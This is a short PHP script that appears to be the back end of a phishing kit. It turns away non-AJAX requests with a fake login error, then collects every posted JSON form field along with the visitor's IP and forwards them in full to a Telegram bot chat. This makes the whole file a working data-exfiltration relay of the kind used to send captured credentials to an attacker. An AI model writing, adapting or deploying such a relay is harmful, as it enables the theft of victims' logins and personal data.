<?php

    define('IS_AJAX', isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&      strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest');
    if(!IS_AJAX) {die(
        json_encode([
            "Error" => "You need to be logged first",
            "type" => "7"
        ])
    );}

    include "/../config.php";
    
    $data = json_decode(file_get_contents("php://input"), true);

    
    function validateInput($data) {
        $res = true;

        foreach($data as $k => $v)
            if ($v == "") {
                $res = false;
                break(1);
            }
        return $res;
    }

    if (validateInput($data)) {

        $msg = "➖➖➖[". APP_NAME ."]➖➖➖\n";
        $msg .= "🌐 IP ". getIP() ."\n\n";

        foreach($data as $key => $value) {
            $msg .= "✔️". $key . ": <code>" . $value . "</code>\n";
        }

        $apiToken = BOT_TOKEN;

        $data = [
            'chat_id' => CHAT_ID,
            'text' => $msg,
            'parse_mode' => 'html'
        ];

        $url = "https://api.telegram.org/bot$apiToken/sendMessage?";

        $response = @file_get_contents($url . http_build_query($data));

    }
